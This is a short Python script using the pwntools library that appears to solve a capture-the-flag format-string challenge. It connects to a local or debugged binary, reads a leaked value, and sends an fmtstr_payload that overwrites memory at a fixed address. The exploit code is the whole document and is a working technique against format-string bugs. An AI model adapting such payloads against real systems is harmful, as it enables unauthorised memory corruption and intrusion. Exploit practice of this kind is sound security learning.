#!/usr/bin/env python3

from pwn import *

e = ELF("./bin_patched")

context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            b *vuln+73
            """)
    elif cond == 3:
        r = remote("addr", 1337)

    return r


def main():
    r = conn(2)


    # r.sendline(b"A" * 0x4 + b".%08x" * 10)
    # r.interactive()

    offset = 7
    target = 0x804a070
    r.recvuntil(b"m value is: ")

    value = int(r.recvline()[:-1],16)
    print(hex(value))

    writes = {target:value}

    payload = fmtstr_payload(offset, writes)

    r.send(payload.ljust(127, b"\x00"))

    r.interactive()



    r.interactive()

if __name__ == "__main__":
    main()